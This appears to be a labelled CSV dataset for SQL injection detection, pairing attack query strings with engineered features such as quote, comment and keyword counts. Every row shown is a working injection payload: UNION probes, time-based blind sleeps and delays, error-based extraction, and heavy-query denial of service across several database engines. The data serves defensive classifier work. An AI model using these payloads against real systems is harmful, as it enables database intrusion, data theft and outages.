Query,Label,query_len,num_words_query,no_single_qts,no_double_qts,no_punct,no_single_cmnt,no_mult_cmnt,no_space,no_perc,no_log_opt,no_arith,no_null,no_hexa,no_alpha,no_digit,len_of_chr_char_null,genuine_keywords
"-4210""  )   where 2679  =  2679 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  |",1,255,52,0,1,38,0,0,51,0,6,1,0,0,78,41,5,1
"1 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  # urzg",1,238,49,0,0,40,0,0,48,0,6,0,2,0,76,27,9,0
"1""   )    )    and elt  (  3785  =  9386,9386  )   and    (    (   ""inwa"" like ""inwa",1,84,16,0,4,12,0,0,15,0,2,0,0,0,21,13,0,0
"1""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",1,87,19,0,1,12,0,0,18,0,0,1,0,0,30,2,0,2
1   )    )    as vcvn where 2106  =  2106,1,41,9,0,0,3,0,0,8,0,0,0,0,0,11,9,0,0
"-8609' union all select 9384,9384,9384,9384--",1,45,5,1,0,7,1,0,4,0,0,3,0,0,14,20,0,1
"1 where 5332  =  5332 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1,273,49,0,0,32,1,0,48,0,1,4,0,0,101,43,1,4
"1""  )   as ivuv where 5691  =  5691",1,35,8,0,1,3,0,0,7,0,0,0,0,0,11,9,0,0
if  (  2643  =  1393  )   select 2643 else drop function nqss--,1,63,12,0,0,5,1,0,11,0,0,2,0,0,28,12,0,1
"1""   )    )    and   (  3020  =  3020  )  *6703 and    (    (   ""njdx"" like ""njdx",1,81,16,0,4,12,0,0,15,0,2,1,0,0,18,13,0,0
"1""  )   and   (  4085  =  4885  )  *4885 and   (  ""sxte""  =  ""sxte",1,66,14,0,4,11,0,0,13,0,2,1,0,0,14,13,0,0
"-9557  )   where 2891  =  2891 union all select 2891,2891,2891,2891,2891,2891,2891,2891,2891--",1,94,10,0,0,13,1,0,9,0,0,3,0,0,19,48,0,1
"1"" union all select null,null,null,null,null,null,null,null--",1,61,5,0,1,10,1,0,4,0,0,2,8,0,46,1,8,1
1'  )   waitfor delay '0:0:5'--,1,31,5,3,0,8,1,0,4,0,0,2,0,0,12,4,0,0
"1'  )   as bdei where 9531  =  9531 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,151,27,1,0,16,1,0,26,0,1,3,0,0,76,16,0,2
"1'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,135,23,1,0,17,1,0,22,0,1,3,0,0,65,8,0,2
"1%'   )    )     )   union all select null,null,null,null,null,null,null,null#",1,78,8,1,0,13,0,0,7,1,0,0,8,0,46,1,8,1
"1' in boolean mode  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1,90,16,1,0,9,0,0,15,0,1,0,0,1,29,21,0,0
"1 or elt  (  6272  =  6272,sleep  (  5   )    )   ",1,50,11,0,0,6,0,0,11,0,1,0,0,0,10,10,0,0
"1' where 8969  =  8969 union all select null,null,null,null,null--",1,66,9,1,0,8,1,0,8,0,0,2,5,0,39,9,5,1
-5299 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (,1,255,56,0,0,34,0,0,55,0,1,8,0,0,65,38,9,1
"iif  (  2840  =  3788,1,1/0  )  ",1,32,6,0,0,6,0,0,6,0,0,1,0,0,3,11,0,0
"1""   )    )    as xwrq where 4161  =  4161",1,42,9,0,1,4,0,0,8,0,0,0,0,0,11,9,0,0
-4681 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ,1,255,51,0,0,39,0,0,51,0,7,1,0,0,78,36,6,1
"1%""   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1,87,15,0,1,12,0,0,14,1,1,0,0,1,16,21,0,0
select   (  case when   (  2968  =  2021  )   then 1 else 2968*  (  select 2968 from master..sysdatabases  )   end  )  --,1,121,22,0,0,12,1,0,21,0,0,3,0,0,53,17,0,2
"1'   )    )    as fusi where 2788  =  2788 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1,108,20,1,0,11,0,0,19,0,1,0,0,1,28,27,0,0
"1' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'kudh' like 'kudh",1,162,26,4,0,21,0,0,25,0,2,0,0,1,49,39,0,1
"-9947""   )    )     )   union all select 8765,8765,8765,8765,8765#",1,66,8,0,1,10,0,0,7,0,0,1,0,0,14,24,0,1
1  )   as phja where 4627  =  4627,1,34,8,0,0,2,0,0,7,0,0,0,0,0,11,9,0,0
"1  )   where 5550  =  5550   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --",1,307,56,0,0,40,1,0,55,0,3,2,1,0,112,42,6,1
"-9937'   )    )    union all select 3900,3900,3900,3900,3900,3900,3900,3900,3900#",1,81,7,1,0,13,0,0,6,0,0,1,0,0,14,40,0,1
"1%""   )    )    and elt  (  7633  =  4110,4110  )   and    (    (   ""%""  =  """,1,77,16,0,4,15,0,0,15,2,2,0,0,0,9,13,0,0
"1'  )   where 6387  =  6387 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,200,33,1,0,17,1,0,32,0,1,3,0,0,114,20,0,2
"1' and elt  (  1533  =  5695,5695  )   and 'ycgi'  =  'ycgi",1,59,12,4,0,9,0,0,11,0,2,0,0,0,17,13,0,0
"1"" or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and ""xqgt"" like ""xqgt",1,144,23,0,4,15,0,0,22,0,2,1,0,0,86,8,0,2
"1%' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and '%'  =  '",1,186,35,4,0,28,0,0,34,2,2,1,0,1,47,32,0,3
"-4798""   )    )     )   union all select 7892,7892,7892,7892,7892,7892,7892,7892,7892,7892#",1,91,8,0,1,15,0,0,7,0,0,1,0,0,14,44,0,1
"1""  )   where 3250  =  3250 union all select null#",1,50,10,0,1,4,0,0,9,0,0,0,1,0,23,9,1,1
"1%'   )    )     )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  '%'  =  '",1,164,29,4,0,24,0,0,28,2,2,1,0,0,67,8,0,2
"1'   )    )     )   union all select null,null,null,null,null,null,null,null#",1,77,8,1,0,12,0,0,7,0,0,0,8,0,46,1,8,1
-6855'  )   or 8519  =  9248,1,28,6,1,0,4,0,0,5,0,1,1,0,0,2,12,0,0
"-4764  )   where 8200  =  8200 union all select 8200,8200,8200,8200--",1,69,10,0,0,8,1,0,9,0,0,3,0,0,19,28,0,1
"1""   )    )    as qrrx where 4633  =  4633 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,161,27,0,1,21,1,0,26,0,1,3,0,0,74,18,0,2
"1""   )    )    as gqxk where 9199  =  9199 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --",1,438,96,0,1,72,1,0,95,0,14,2,0,0,112,59,13,2
"1'+  (  select lgkd where 7801  =  7801 and elt  (  4249  =  4249,7259   )    )   +'",1,84,17,2,0,11,0,0,16,0,1,2,0,0,21,21,0,1
"1 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  -- btqa",1,145,24,0,0,19,1,0,23,0,1,2,0,1,37,39,0,1
"1""   )    )    as lfte where 3811  =  3811 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1,212,40,0,1,27,1,0,39,0,1,3,0,1,54,40,0,3
1' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) ,1,321,67,1,0,55,0,0,67,0,11,0,0,0,89,45,10,1
"1   )    )    as bgdm where 3473  =  3473 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",1,180,31,0,0,22,1,0,30,0,1,2,0,1,44,47,0,1
"1' and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'lwir' like 'lwir",1,150,25,4,0,17,0,0,24,0,2,1,0,0,87,9,0,2
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4#",1,103,15,0,0,11,0,0,14,0,0,1,0,0,69,4,0,2
"-3063%""   )    )     )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 el",1,255,55,0,1,43,0,0,54,1,8,1,0,0,61,36,7,2
-5389'||  (  select 'gggl' where 1020  =  1020 union all select 1020#,1,69,12,3,0,9,0,0,11,0,1,1,0,0,29,16,0,2
"1%""  )   union all select null,null,null#",1,41,6,0,1,6,0,0,5,1,0,0,3,0,26,1,3,1
"1"" where 9172  =  9172 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",1,313,61,0,1,34,1,0,60,0,1,4,0,0,103,63,0,7
"1"" or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,117,20,0,1,14,1,0,19,0,1,3,0,0,64,8,0,2
"-8013%"" or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  ",1,255,54,0,1,34,0,0,54,1,1,7,0,0,75,35,8,2
select   (  case when   (  4043  =  5276  )   then 4043 else 4043*  (  select 4043 from information_schema.character_sets  )   end  )  #,1,136,22,0,0,12,0,0,21,0,0,1,0,0,65,20,1,2
"1  )   where 8691  =  8691 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,128,23,2,0,17,1,0,22,0,1,3,0,0,36,23,0,0
"-3555'  )   or make_set  (  9354  =  9354,7185  )   and   (  'papr'  =  'papr",1,77,14,4,0,13,0,0,13,0,2,1,0,0,20,16,0,0
"1%""   )    )    union all select null,null,null,null,null--",1,59,7,0,1,10,1,0,6,1,0,2,5,0,34,1,5,1
-6473' union all select 7537#,1,29,5,1,0,3,0,0,4,0,0,1,0,0,14,8,0,1
1'+  (  select 'yahq' where 6974  =  6974 union all select null--,1,65,12,3,0,8,1,0,11,0,0,3,1,0,33,9,1,2
"1'  )   where 8268  =  8268 union all select null,null,null,null--",1,66,10,1,0,8,1,0,9,0,0,2,4,0,35,9,4,1
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   '%'  =  '",1,123,23,3,0,19,0,0,22,1,1,0,1,0,41,14,2,0
1'   )    )    and   (  3020  =  3020  )  *6703 and    (    (   'pfal'  =  'pfal,1,80,16,4,0,13,0,0,15,0,2,1,0,0,14,13,0,0
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and '%'  =  '",1,104,17,3,0,13,0,0,16,1,1,1,0,0,65,3,0,2
" end and ""xlvn""  =  ""xlvn",1,25,5,0,3,4,0,0,5,0,1,0,0,0,14,0,0,0
"1'   )    )     )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  'istb'  =  'istb",1,145,26,4,0,21,0,0,25,0,2,1,0,0,42,13,0,2
"1'   )    )    as mxxd where 7255  =  7255 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,169,30,1,0,19,1,0,29,0,1,3,0,0,82,17,0,2
1%'  )   order by 1#,1,20,5,1,0,4,0,0,4,1,0,0,0,0,7,2,0,1
"1 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   -- kvkk",1,74,13,0,0,8,1,0,12,0,1,2,0,1,19,22,0,0
"-2441' union all select 1853,1853,1853,1853,1853,1853,1853--",1,60,5,1,0,10,1,0,4,0,0,3,0,0,14,32,0,1
"1  )   union all select null,null,null,null,null,null,null,null,null#",1,69,6,0,0,10,0,0,5,0,0,0,9,0,50,1,9,1
1' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and 'fdbm' like 'fdbm,1,345,71,4,0,58,0,0,70,0,12,0,0,0,104,45,10,1
"1""  )   union all select null,null,null,null,null,null#",1,55,6,0,1,8,0,0,5,0,0,0,6,0,38,1,6,1
"1%""   )    )    and 7358  =  6986--",1,35,7,0,1,7,1,0,6,1,1,2,0,0,3,9,0,0
"iif  (  1149  =  4765,1,1/0  )  ",1,32,6,0,0,6,0,0,6,0,0,1,0,0,3,11,0,0
"1' in boolean mode  )   union all select null,null,null,null,null#",1,66,9,1,0,7,0,0,8,0,0,0,5,0,47,1,5,1
select   (  case when   (  6804  =  7050  )   then 6804 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,133,29,0,0,12,1,0,28,0,0,3,0,0,56,14,0,2
1'   )    )    rlike sleep  (  5  )  #,1,38,9,1,0,6,0,0,8,0,0,0,0,0,10,2,0,0
"1  )   as agex where 8167  =  8167 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",1,102,19,0,0,10,1,0,18,0,1,2,0,1,26,30,0,0
"-5292'  )   union all select 1439,1439,1439,1439#",1,49,6,1,0,7,0,0,5,0,0,1,0,0,14,20,0,1
"1' where 4358  =  4358 union all select null,null,null,null--",1,61,9,1,0,7,1,0,8,0,0,2,4,0,35,9,4,1
"1%""   )    )     )   union all select null,null#",1,48,8,0,1,7,0,0,7,1,0,0,2,0,22,1,2,1
"1'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'jmjw' like 'jmjw",1,284,50,4,0,35,0,0,49,0,2,2,0,0,111,35,1,4
"1  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  5130  =  5130",1,167,27,0,0,19,0,0,26,0,2,0,0,1,40,43,0,1
"1%""  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  ""%""  =  """,1,358,73,0,4,58,0,0,72,2,6,0,2,0,107,35,9,1
"1 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",1,240,39,0,0,27,0,0,39,0,1,2,0,1,48,71,0,4
1'+  (  select 'vddk' where 6961  =  6961,1,41,8,3,0,6,0,0,7,0,0,1,0,0,15,9,0,1
"-2790""   )    )    as vcvw where 6075  =  6075 or 7078  =  8148--",1,65,13,0,1,8,1,0,12,0,1,3,0,0,13,20,0,0
"1'||  (  select 'dukt' where 3206  =  3206 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7   )    )   ||'",1,222,36,4,0,23,0,0,35,0,3,1,0,0,123,20,0,3
1 where 6500  =  6500,1,21,5,0,0,1,0,0,4,0,0,0,0,0,5,9,0,0
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   'zdkn'  =  'zdkn",1,126,18,3,0,18,0,0,17,0,1,1,0,0,71,5,0,2
1%'   )    )    waitfor delay '0:0:5'--,1,39,6,3,0,10,1,0,5,1,0,2,0,0,12,4,0,0
"-7138"" union all select 2341,2341,2341,2341--",1,45,5,0,1,7,1,0,4,0,0,3,0,0,14,20,0,1
1'+  (  select wpbj where 1849  =  1849,1,39,8,1,0,4,0,0,7,0,0,1,0,0,15,9,0,1
"iif  (  6369  =  5881,1,1/0  )  ",1,32,6,0,0,6,0,0,6,0,0,1,0,0,3,11,0,0
1'||  (  select 'yucg' where 2576  =  2576 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual   )    )   ||',1,446,96,4,0,77,0,0,95,0,16,0,0,0,116,59,13,3
1'+  (  select 'hrxp' where 5948  =  5948,1,41,8,3,0,6,0,0,7,0,0,1,0,0,15,9,0,1
select   (  case when   (  9103  =  9836  )   then 9103 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,133,29,0,0,12,1,0,28,0,0,3,0,0,56,14,0,2
"1   )    )    as vrev where 4248  =  4248 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",1,181,31,0,0,22,1,0,30,0,1,2,0,1,45,47,0,1
"1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#",1,80,10,1,0,10,0,0,9,0,0,0,7,0,47,9,7,1
"1 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- nqdb",1,176,33,0,0,23,1,0,32,0,1,3,0,1,47,32,0,3
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual  )  +'",1,128,25,1,0,23,0,0,24,0,3,1,0,0,48,10,4,1
"1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and 'ggcm' like 'ggcm",1,196,39,4,0,31,0,0,38,0,5,0,1,0,67,24,6,0
1' where 2183  =  2183,1,22,5,1,0,2,0,0,4,0,0,0,0,0,5,9,0,0
"1%""   )    )    order by 1--",1,28,6,0,1,6,1,0,5,1,0,2,0,0,7,2,0,1
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'bzxo' like 'bzxo",1,116,18,5,0,15,0,0,17,0,1,1,0,0,50,10,0,1
-5250  )   where 1591  =  1591 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,1,145,28,4,0,19,1,0,27,0,3,3,0,0,57,26,0,1
"1""  )   where 3058  =  3058 union all select null--",1,51,10,0,1,5,1,0,9,0,0,2,1,0,23,9,1,1
"1' where 1895  =  1895 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,140,23,1,0,19,1,0,22,0,1,3,0,0,67,18,0,2
"1""   )    )    rlike   (  select   (  case when   (  5342  =  1036  )   then 1 else 0x28 end   )    )    and    (    (   ""ntdz"" like ""ntdz",1,138,27,0,4,15,0,0,26,0,1,0,0,1,46,13,0,1
"1%"" or sleep  (  5  )   and ""%""  =  """,1,37,10,0,4,9,0,0,9,2,2,0,0,0,10,2,0,0
"1%""   )    )    union all select null,null,null--",1,49,7,0,1,8,1,0,6,1,0,2,3,0,26,1,3,1
"1,  (  case when 2872  =  2872 then 1 else null end  )  ",1,56,13,0,0,4,0,0,13,0,0,0,1,0,23,10,1,0
"1   )    )     (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (   1402  =  1402",1,374,75,0,0,54,0,0,74,0,6,0,2,0,107,43,9,1
"1""  )   where 3727  =  3727 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1,373,81,0,1,52,1,0,80,0,1,12,0,0,97,55,12,2
1'   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   'trzi'  =  'trzi,1,137,27,4,0,16,0,0,26,0,1,0,0,1,42,13,0,1
"-4135""  )   as leiz where 3582  =  3582 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144",1,255,55,0,1,40,0,0,54,0,8,1,0,0,66,43,7,2
1'  )   where 5331  =  5331,1,27,6,1,0,3,0,0,5,0,0,0,0,0,5,9,0,0
"1 and make_set  (  6911  =  1867,1867  )  ",1,42,8,0,0,5,0,0,8,0,1,0,0,0,10,13,0,0
"-7971   )    )    as armw where 9474  =  9474 or make_set  (  9354  =  9354,7185  )  --",1,87,17,0,0,11,1,0,16,0,1,3,0,0,20,24,0,0
1'   )    )    as xqam where 6750  =  6750,1,42,9,1,0,4,0,0,8,0,0,0,0,0,11,9,0,0
"waitfor delay '0:0:5' and    (    (   ""ykgm""  =  ""ykgm",1,54,9,2,3,10,0,0,8,0,1,0,0,0,23,3,0,0
"1""  )   where 8098  =  8098",1,27,6,0,1,3,0,0,5,0,0,0,0,0,5,9,0,0
"-1483' or make_set  (  9354  =  9354,7185  )   and 'qfil'  =  'qfil",1,67,12,4,0,11,0,0,11,0,2,1,0,0,20,16,0,0
"1%""   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  ""%""  =  """,1,341,66,0,4,43,0,0,65,2,2,2,0,0,102,55,0,7
1'   )    )     )   and 9198  =  9198--,1,39,8,1,0,7,1,0,7,0,1,2,0,0,3,9,0,0
1'  )   as rvli where 4427  =  4427,1,35,8,1,0,3,0,0,7,0,0,0,0,0,11,9,0,0
1'   )    )    as wdor where 7426  =  7426,1,42,9,1,0,4,0,0,8,0,0,0,0,0,11,9,0,0
"-7016%""   )    )    union all select 8847,8847,8847--",1,53,7,0,1,9,1,0,6,1,0,3,0,0,14,16,0,1
